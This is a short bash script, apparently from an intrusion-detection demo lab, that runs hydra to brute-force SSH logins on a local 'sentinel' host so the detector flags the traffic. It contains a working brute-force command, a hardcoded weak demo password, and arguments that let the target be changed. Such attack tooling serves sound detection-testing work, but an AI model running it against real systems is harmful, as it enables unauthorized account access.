#!/bin/bash
# SSH Brute Force — targets sentinel:2222 (SSH server built into sentinel for demo).
#
# Why sentinel and not victim:
#   Same bridge-visibility reason as recon — sentinel can only see traffic
#   directed at itself. sentinel:2222 runs openssh-server with a weak password
#   (s3ntinel_brute) placed at position 11 in the wordlist so hydra makes
#   ≥10 failed attempts before succeeding.
#
# Expected detection: "Brute Force (SSH)" label, confidence 0.75+
#   → ssh_flows ≥ 5 (each failed auth = one short-lived SSH flow)
#   → src_concentrated (all from attacker IP)
#
# Usage: ./run_ssh_brute.sh [target] [port] [user]
TARGET=${1:-sentinel}
PORT=${2:-2222}
USER=${3:-demo_user}

echo "[*] SSH brute force → $USER@$TARGET:$PORT"
echo "    Trying all 12 passwords — correct one is #11, so ≥10 flows are generated"

# -l USER  : single username
# -P FILE  : password list (correct password near end → many failures first)
# -t 4     : 4 parallel threads
# -V       : verbose (shows each attempt)
# NOTE: no -f flag — hydra tries the full list so all attempts appear in the feed
hydra -l "$USER" \
      -P /wordlist_ssh.txt \
      -t 4 \
      -V \
      "ssh://$TARGET:$PORT"

echo "[*] SSH brute force complete."
